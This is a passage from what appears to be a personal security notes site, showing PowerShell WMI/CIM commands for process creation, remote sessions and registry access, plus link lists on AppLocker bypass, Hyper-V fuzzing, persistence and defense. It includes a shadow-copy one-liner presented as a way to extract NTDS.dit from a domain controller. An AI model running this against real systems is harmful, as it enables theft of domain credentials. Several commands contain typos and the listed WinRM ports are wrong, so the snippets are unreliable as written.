<div class="codehilite"><pre><span></span><span class="nb">Get-CimClass</span> <span class="n">-ClassName</span> <span class="n">Win32_Process</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">-ExpandProperty</span> <span class="n">CimClassMethods</span> <span class="p">|</span> <span class="nb">where </span><span class="n">name</span> <span class="o">-eq</span> <span class="s2">&quot;Create&quot;</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">-ExpandProperty</span> <span class="n">Parameters</span>
</pre></div></p>
<p>Invoke:
<div class="codehilite"><pre><span></span><span class="nb">Invoke-WmiMethod</span> <span class="n">-Class</span> <span class="n">Win32_process</span> <span class="n">-Name</span> <span class="n">create</span> <span class="n">-ArgumentList</span> <span class="n">calc</span><span class="p">.</span><span class="n">exe</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="nb">Invoke-CimMethod</span> <span class="n">-ClassName</span> <span class="n">Win32_process</span> <span class="n">-MethodName</span> <span class="n">Create</span> <span class="n">-Arguments</span> <span class="p">@{</span><span class="n">CommandLine</span> <span class="p">=</span> <span class="s2">&quot;calc.exe&quot;</span><span class="p">}</span>
</pre></div></p>
<p><strong>Update Instance</strong></p>
<div class="codehilite"><pre><span></span><span class="nb">Get-WritableProperties</span> 
</pre></div>

<div class="codehilite"><pre><span></span><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">Win32_Printer</span> <span class="n">-FIlter</span> <span class="s2">&quot;name = &#39;Microsoft XPS Document Writer&#39;&quot;</span> <span class="p">|</span> <span class="nb">Set-WmiInstance</span> <span class="n">-Arguments</span> <span class="p">@{</span><span class="n">Comment</span> <span class="p">=</span> <span class="s2">&quot;Example comment&quot;</span><span class="p">}</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="nb">Get-CimInstancet</span> <span class="n">-ClassName</span> <span class="n">Win32_Printer</span> <span class="n">-FIlter</span> <span class="s2">&quot;name = &#39;Microsoft XPS Document Writer&#39;&quot;</span> <span class="p">|</span> <span class="nb">Set-CimInstance</span> <span class="n">-Property</span> <span class="p">@{</span><span class="n">Comment</span> <span class="p">=</span> <span class="s2">&quot;Example comment&quot;</span><span class="p">}</span>
</pre></div>

<p><strong>Associations</strong></p>
<blockquote>
<p><a href="https://github.com/dfinke/images/blob/master/acn.png">https://github.com/dfinke/images/blob/master/acn.png</a></p>
</blockquote>
<p><img alt="acn.png" src="../_assets/acn.png" /></p>
<div class="codehilite"><pre><span></span><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="p">*</span><span class="n">Win32_NetworkAdapter</span><span class="p">*</span> <span class="n">-List</span> <span class="p">|</span> <span class="nb">fl </span><span class="p">*</span>
<span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">Win32_NetworkAdapter</span> <span class="n">-List</span> <span class="p">|</span> <span class="nb">fl </span><span class="p">*</span>

<span class="nb">Get-WmiObject</span> <span class="n">-Query</span> <span class="s2">&quot;Associators of {win32_NetworkAdapter.DeviceID=11}&quot;</span>
<span class="nb">Get-WmiObject</span> <span class="n">-Query</span> <span class="s2">&quot;Associators of {win32_NetworkAdapter.DeviceID=11} Where ClassDefsOnly&quot;</span>

<span class="nb">Get-CimAssociatedInstance</span> <span class="n">-InputObject</span> <span class="p">(</span><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">Win32_NetworkAdapter</span> <span class="n">-Filter</span> <span class="s1">&#39;DeviceId = 11&#39;</span><span class="p">)</span>
</pre></div>

<p>Only see one association class: 
<div class="codehilite"><pre><span></span><span class="nb">Get-WmiObject</span> <span class="n">-Query</span> <span class="s2">&quot;Associators of {win32_NetworkAdapter.DeviceID=11}&quot;</span> <span class="n">-AssociationClass</span> <span class="n">Win32_ProtocolBinding</span> 
</pre></div></p>
<p>Get references (classes linking two other classes)
<div class="codehilite"><pre><span></span><span class="nb">Get-WimObject</span> <span class="n">-Query</span> <span class="s2">&quot;References of {win32_NetworkAdapter.DeviceID=11} Where ClassDefsOnly&quot;</span>
<span class="nb">Get-WimObject</span> <span class="n">-Query</span> <span class="s2">&quot;References of {win32_NetworkAdapter.DeviceID=11}&quot;</span> 
</pre></div></p>
<h3 id="interesting-queries">Interesting Queries<a class="headerlink" href="#interesting-queries" title="Permanent link">&para;</a></h3>
<ul>
<li>List all the systems within the current environment/directory:  <code class="codehilite"><span class="k">SELECT</span> <span class="n">ds_cn</span> <span class="k">FROM</span> <span class="n">ds_computer</span></code></li>
<li>Installed software: </li>
<li>File listing:</li>
<li>Services:</li>
<li>Logon accounts:</li>
<li>Hardware information:</li>
<li>Installed patches:</li>
<li>Security logs:</li>
<li>Command line used to start processes: </li>
<li>Path to executable for running processes: </li>
</ul>
<h3 id="useful-wmi-classes">Useful WMI Classes<a class="headerlink" href="#useful-wmi-classes" title="Permanent link">&para;</a></h3>
<ul>
<li>Win32_OperatingSystem</li>
<li>Win32_Process</li>
<li>Win32_IP4RouteTable</li>
<li>Win32_UserAccount</li>
<li>Win32_Groups</li>
<li>Win32_ShadowCopy<ul>
<li>Create a shadow copy of AD's drive and extract NTDS.dit</li>
<li><code class="codehilite"><span class="p">(</span><span class="k">Get</span><span class="o">-</span><span class="n">WmiObject</span> <span class="o">-</span><span class="k">Class</span> <span class="n">Win32_ShadowCopy</span> <span class="o">-</span><span class="n">list</span><span class="p">).</span><span class="k">create</span><span class="p">(</span><span class="ss">&quot;C:\&quot;</span><span class="p">,</span> <span class="ss">&quot;CreateAccessible&quot;</span><span class="p">)</span><span class="err">$</span><span class="n">link</span> <span class="o">=</span> <span class="p">(</span><span class="k">Get</span><span class="o">-</span><span class="n">WmiObject</span> <span class="o">-</span><span class="k">Class</span> <span class="n">Winn32_ShadowCopy</span><span class="p">).</span><span class="n">DeviceObject</span> <span class="o">+</span> <span class="ss">&quot;\&quot;</span><span class="n">cmd</span> <span class="o">/</span><span class="k">c</span> <span class="n">mklink</span> <span class="o">/</span><span class="n">d</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">shadowcopy</span> <span class="ss">&quot;$link&quot;</span></code></li>
</ul>
</li>
<li>AD</li>
</ul>
<h3 id="tools_1">Tools<a class="headerlink" href="#tools_1" title="Permanent link">&para;</a></h3>
<ul>
<li>WMI Object Browser:</li>
<li>WMIC</li>
</ul>
<div class="codehilite"><pre><span></span><span class="c"># WMIC Verbs can be explored by looking at help </span>

<span class="c"># Interactive </span>
<span class="n">wmic</span> 
<span class="n">wmic</span><span class="err">:</span><span class="n">root</span><span class="p">\</span><span class="n">cli</span><span class="p">&gt;</span> <span class="k">process</span> <span class="p">/?</span>
<span class="n">wmic</span><span class="err">:</span><span class="n">root</span><span class="p">\</span><span class="n">cli</span><span class="p">&gt;</span> <span class="nb">group where </span><span class="n">name</span><span class="p">=</span><span class="s1">&#39;Administrators&#39;</span> <span class="n">assoc</span>

<span class="c"># Non-interactive </span>
<span class="n">wmic</span> <span class="k">process</span> <span class="p">/?</span>
</pre></div>

<ul>
<li>Powershell WMI Browser</li>
<li>WMI Code Generator </li>
<li>WMIGen</li>
</ul>
<h3 id="remoting">Remoting<a class="headerlink" href="#remoting" title="Permanent link">&para;</a></h3>
<ul>
<li>WMI Cmdlets  <ul>
<li>Uses DCOM </li>
<li>Port 135 (winmgmt service)</li>
<li>Not firewall / NAT friendly </li>
<li>Data exchanged on dynamic ports (<code class="codehilite"><span class="n">HKLM</span><span class="err">\</span><span class="n">Software</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Rpc</span><span class="err">\</span><span class="n">Internet</span></code>)</li>
</ul>
</li>
<li>CIM Cmdlets <ul>
<li>DCOM 135</li>
<li>WinRm/WSMan<ul>
<li>5385 - HTTP</li>
<li>5386 - HTTPS</li>
<li>Firewall and NAT friendly </li>
</ul>
</li>
</ul>
</li>
</ul>
<p>Session over WinRM/WSMan:
<div class="codehilite"><pre><span></span><span class="nv">$sess</span> <span class="p">=</span> <span class="nb">New-CimSession</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">name</span><span class="p">&gt;</span> <span class="n">-Credential</span> <span class="p">&lt;</span><span class="n">cred</span><span class="p">&gt;</span>
<span class="nb">Get-CimInstance</span> <span class="n">-CimSession</span> <span class="nv">$sess</span> <span class="n">-ClassName</span> <span class="n">Win32_OperatingSystem</span>
</pre></div></p>
<p>Session over DCOM:
<div class="codehilite"><pre><span></span><span class="nv">$sessOptions</span> <span class="p">=</span> <span class="nb">New-CimSessionOption</span> <span class="n">-Protocol</span> <span class="n">Dcom</span>
<span class="nv">$newsess</span> <span class="p">=</span> <span class="nb">New-CimSession</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">name</span><span class="p">&gt;</span> <span class="n">-Credential</span> <span class="p">&lt;</span><span class="n">cred</span><span class="p">&gt;</span> <span class="n">-SessionOption</span> <span class="nv">$sessOptions</span>
</pre></div></p>
<h3 id="access-registry">Access Registry<a class="headerlink" href="#access-registry" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="nb">Get-WimObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="k">default</span> <span class="n">-Class</span> <span class="n">StdRegProv</span> <span class="n">-List</span>

<span class="nb">Get-WimObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="k">default</span> <span class="n">-Class</span> <span class="n">StdRegProv</span> <span class="n">-List</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">methods</span> <span class="p">|</span> <span class="n">more</span>

<span class="nv">$RegProv</span> <span class="p">=</span> <span class="nb">Get-WimObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="k">default</span> <span class="n">-Class</span> <span class="n">StdRegProv</span> <span class="n">-List</span> 
<span class="nv">$RegProv</span><span class="p">.</span><span class="n">Methods</span> 
</pre></div>

<div class="codehilite"><pre><span></span><span class="nv">$RemoteReg</span> <span class="p">=</span> <span class="nb">Get-WmiObject</span> <span class="n">-List</span> <span class="s2">&quot;StdRegProv&quot;</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">name</span><span class="p">&gt;</span> <span class="n">-Credential</span> <span class="p">&lt;</span><span class="n">cred</span><span class="p">&gt;</span>
<span class="nv">$RemoteReg</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">methods</span> <span class="p">|</span> <span class="n">more</span>
<span class="nv">$RemoteReg</span><span class="p">.</span><span class="n">getStringValue</span><span class="p">(&lt;</span><span class="n">id</span><span class="p">&gt;,</span> <span class="p">&lt;</span><span class="n">path</span><span class="p">&gt;,</span> <span class="p">&lt;</span><span class="n">propertyName</span><span class="p">&gt;)</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="n">WmiInvokeMethod</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="k">default</span> <span class="n">-Class</span> <span class="n">StdRegProv</span> <span class="n">-Name</span> <span class="n">GetStringValue</span> <span class="p">@(&lt;</span><span class="n">id</span><span class="p">&gt;,&lt;</span><span class="n">path</span><span class="p">&gt;,&lt;</span><span class="n">property</span><span class="p">&gt;)</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="n">Posh_SecMod</span> <span class="p">\</span> <span class="n">Registry</span><span class="p">.</span><span class="n">ps1</span> 
</pre></div>

<h3 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html">Playing with MOF files on Windows, for fun &amp; profit</a></li>
<li><a href="https://sites.google.com/site/beyondexcel/project-updates/exposingsystemsecretswithvbaandwmiapi">Exposing System Secrets with VBA and WMI API</a></li>
<li><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows">How to use WbemExec for a write privilege attack on Windows</a></li>
</ul>
<h2 id="applocker">AppLocker<a class="headerlink" href="#applocker" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://github.com/api0cradle/UltimateAppLockerByPassList">https://github.com/api0cradle/UltimateAppLockerByPassList</a></li>
</ul>
<h2 id="hyperv">HyperV<a class="headerlink" href="#hyperv" title="Permanent link">&para;</a></h2>
<ul>
<li>Fuzzing para-virtualized devices in Hyper-V: <a href="https://blogs.technet.microsoft.com/srd/2019/01/28/fuzzing-para-virtualized-devices-in-hyper-v/">https://blogs.technet.microsoft.com/srd/2019/01/28/fuzzing-para-virtualized-devices-in-hyper-v/</a></li>
<li>Writing a Hyper-V "Bridge" for Fuzzing — Part 1: WDF: <a href="http://www.alex-ionescu.com/?p=377">http://www.alex-ionescu.com/?p=377</a></li>
<li>Writing a Hyper-V "Bridge" for Fuzzing — Part 2 : Hypercalls &amp; MDLs: <a href="http://www.alex-ionescu.com/?p=471">http://www.alex-ionescu.com/?p=471</a></li>
<li><a href="https://blogs.technet.microsoft.com/srd/2018/12/10/first-steps-in-hyper-v-research/">https://blogs.technet.microsoft.com/srd/2018/12/10/first-steps-in-hyper-v-research/</a></li>
<li><a href="https://blogs.technet.microsoft.com/srd/2018/05/03/hyper-v-debugging-symbols-are-publicly-available/">https://blogs.technet.microsoft.com/srd/2018/05/03/hyper-v-debugging-symbols-are-publicly-available/</a></li>
<li><a href="https://github.com/comaeio/LiveCloudKd">https://github.com/comaeio/LiveCloudKd</a></li>
</ul>
<h2 id="events">Events<a class="headerlink" href="#events" title="Permanent link">&para;</a></h2>
<p><strong>Tools</strong></p>
<ul>
<li>EtwExplorer - View Event Tracing for Windows (ETW) Provider manifests: <a href="https://github.com/zodiacon/EtwExplorer">https://github.com/zodiacon/EtwExplorer</a></li>
</ul>
<h2 id="defense">Defense<a class="headerlink" href="#defense" title="Permanent link">&para;</a></h2>
<ul>
<li>Windows 10 and Server 2016 Secure Baseline Group Policy: <a href="https://github.com/mxk/win10-secure-baseline-gpo">https://github.com/mxk/win10-secure-baseline-gpo</a></li>
<li>Preventing Mimikatz Attacks by Panagiotis Gkatziroulis: <a href="https://hakin9.org/preventing-mimikatz-attacks/">https://hakin9.org/preventing-mimikatz-attacks/</a></li>
<li>Server Security<ul>
<li><a href="https://docs.microsoft.com/en-us/windows-server/security/security-and-assurance">https://docs.microsoft.com/en-us/windows-server/security/security-and-assurance</a></li>
</ul>
</li>
</ul>
<h2 id="references_1">References<a class="headerlink" href="#references_1" title="Permanent link">&para;</a></h2>
<ul>
<li>Schtasks without Schtasks.exe via Reflective DLL: <a href="https://ijustwannared.team/2018/08/13/schtasks-without-schtasks-exe-via-reflective-dll/">https://ijustwannared.team/2018/08/13/schtasks-without-schtasks-exe-via-reflective-dll/</a></li>
<li>Windows 10 Persistence via PATH directories - CDPSvc: <a href="https://www.a12d404.net/windows/2019/01/13/persistance-via-path-directories.html">https://www.a12d404.net/windows/2019/01/13/persistance-via-path-directories.html</a><ul>
<li>CDPSvc (Connected Devices Platform Service) searches the file cdpsgshims.dll inside PATH directories and loads it if found.</li>
<li>With a default Windows installation, there can’t be a non-admin directory in the PATH, so this can’t be exploited.</li>
<li>A sample DLL (source included) that executes calc.exe is available here: <a href="https://github.com/marpie/a12d404.net-files/tree/master/CDPSvcPersist">https://github.com/marpie/a12d404.net-files/tree/master/CDPSvcPersist</a></li>
</ul>
</li>
<li>Useful for vulnerability research workflows on Windows: <a href="https://gist.github.com/jthuraisamy/af862987fff437daec52ee3cc5894203">https://gist.github.com/jthuraisamy/af862987fff437daec52ee3cc5894203</a></li>
<li>Windows 10 Device Security: <a href="https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE2IIVu">https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE2IIVu</a></li>
<li>Windows Command Line cheatsheet (part 1): some useful tips: <a href="https://www.andreafortuna.org/technology/windows/windows-command-line-cheatsheet-part-1-some-useful-tips/">https://www.andreafortuna.org/technology/windows/windows-command-line-cheatsheet-part-1-some-useful-tips/</a></li>
<li>Windows Command Line cheatsheet (part 2): WMIC: <a href="https://www.andreafortuna.org/dfir/windows-command-line-cheatsheet-part-2-wmic/">https://www.andreafortuna.org/dfir/windows-command-line-cheatsheet-part-2-wmic/</a></li>
</ul>
<h3 id="kernel">Kernel<a class="headerlink" href="#kernel" title="Permanent link">&para;</a></h3>
<ul>
<li>Kernel Internals - Windows Sandbox: <a href="https://techcommunity.microsoft.com/t5/Windows-Kernel-Internals/Windows-Sandbox/ba-p/301849">https://techcommunity.microsoft.com/t5/Windows-Kernel-Internals/Windows-Sandbox/ba-p/301849</a></li>
</ul>
                
                  
                
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../windows-issues/" title="Windows issues" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Windows issues
              </span>
            </div>
          </a>
        
        
          <a href="../certifications/cissp/" title="CISSP" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                CISSP
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../assets/javascripts/application.808e90bb.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:".."}})</script>
      
    
  </body>
</html>